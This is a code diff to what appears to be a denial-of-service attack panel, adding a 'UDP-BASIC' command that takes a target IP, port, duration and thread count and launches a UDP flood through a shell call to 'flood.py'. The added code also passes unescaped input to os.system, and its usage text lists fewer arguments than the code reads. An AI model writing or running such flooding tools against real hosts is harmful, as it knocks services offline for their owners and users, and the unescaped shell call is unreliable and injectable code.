@@ -211,6 +211,19 @@ def main():
                 print('Usage: UDP-Mix <ip> <port> <UDP-Mix>')
                 print('Example: UDP-Mix 127.0.0.1 8080 UDP-Mix')
 
+        elif"UDP-BASIC" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2] 
+                choice = cnc.split()[3]
+                times = cnc.split()[4] 
+                threads = cnc.split()[5]
+
+                os.system(f'python flood.py -i {ip} -p {port} -c y -t {times} -th {threads} ')
+            except IndexError:
+                print('Usage: UDP-BASIC <ip> <port> <times> <threads>')
+                print('Example: UDP-BASIC 127.0.0.1 8080 300 10000')
+
         elif "help" in cnc:
             print(f'''
                                 ═════════╦════════════════╦══════════
